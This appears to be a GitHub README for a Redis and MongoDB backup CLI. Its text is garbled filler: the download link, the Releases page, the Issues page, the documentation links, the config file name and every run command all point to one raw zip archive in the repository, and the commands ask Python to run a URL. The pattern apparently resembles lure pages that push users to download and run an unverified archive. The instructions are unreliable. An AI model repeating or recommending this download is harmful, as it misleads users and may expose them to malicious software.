# 🌟 redis-mongo-backup-tool - Simple Backup Solution for Your Databases

## 📦 Download Here
[![Download Latest Release](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip)

## 📖 Description
The redis-mongo-backup-tool is a lightweight command-line interface (CLI) designed for effortless backup and restoration of data in Redis and MongoDB. This tool allows you to back up specific keys from Redis and perform standard dump and restore operations in MongoDB. With its environment-driven approach, you can easily customize it to meet your specific needs.

## ✅ Features
- Backup and restore specific Redis keys using patterns.
- Use MongoDB's native mongodump and mongorestore utilities.
- Environment-driven to adjust settings easily.
- Support for key expiration (TTL) handling in Redis.

## 🚀 Getting Started
To use the redis-mongo-backup-tool, follow the steps below to download and execute the application.

### Step 1: System Requirements
Before you start, ensure your system meets the following requirements:
- Operating System: Windows, macOS, or Linux.
- Python: Version 3.6 or higher installed.
- Redis and MongoDB must be installed and running on your machine.

### Step 2: Download & Install
Visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip).

1. Go to the Releases page.
2. Choose the correct version for your operating system.
3. Download the file.

### Step 3: Extract the Files
If you downloaded a compressed file, extract its contents to a preferred location on your computer.

### Step 4: Open Your Command Line Interface
- On Windows, open Command Prompt or PowerShell.
- On macOS or Linux, open Terminal.

### Step 5: Navigate to the Tool Directory
Change your directory to the location where you extracted the files. Use the `cd` command, like this:

```bash
cd path/to/your/extracted/files
```

### Step 6: Run the Tool
Now, run the backup tool using the following command format:

```bash
python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip [options]
```

### Step 7: Options and Usage
- For backup Redis, use:
  ```bash
  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip --backup-redis --pattern "your_pattern_here"
  ```
  
- For backup MongoDB, use:
  ```bash
  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip --backup-mongo --db "your_db_name"
  ```
  
- To restore from a backup file:
  ```bash
  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip --restore --file "backup_file_here"
  ```

### Step 8: Check the Results
Verify that your backup files are created in the specified output location. You can adjust the output directory by adding an option in your command.

## ⚙️ Configuration
Configure the tool by creating a configuration file. You can specify default options such as:
- Redis server settings.
- MongoDB server settings.
- Backup file path.

The configuration file should be named `https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip` and placed in the same directory as the tool.

## 🔧 Troubleshooting
If you encounter issues:
- Ensure Redis and MongoDB services are running.
- Check that your environment settings are correct.
- Review any error messages for guidance.

## 👩‍💻 Community Support
Feel free to raise any questions or issues on the [GitHub Issues page](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip). Join the community to share experiences, tips, and suggestions for improvement.

## 📄 License
This tool is open source and released under the MIT License. You can modify and use it according to your needs, but please give credit to the authors.

## 🌐 Additional Resources
- [Redis Documentation](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip)
- [MongoDB Documentation](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip)

For detailed usage and advanced options, refer to the wiki section on the GitHub repository. Regular updates will improve tool functionality and performance.  

Happy backing up!